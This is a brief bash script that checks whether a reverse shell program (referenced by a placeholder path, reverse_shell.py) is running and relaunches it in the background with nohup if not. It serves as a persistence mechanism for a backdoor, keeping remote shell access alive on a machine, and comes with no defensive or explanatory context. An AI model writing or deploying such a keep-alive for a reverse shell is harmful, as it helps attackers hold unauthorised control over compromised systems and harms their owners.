#!/bin/bash

# Path to the reverse shell script
SCRIPT_PATH="/path/to/reverse_shell.py"

# Check if the reverse shell script is running
if ! pgrep -f "$SCRIPT_PATH" > /dev/null; then
    echo "Reverse shell script not running. Starting it..."
    nohup python3 "$SCRIPT_PATH" &
fi
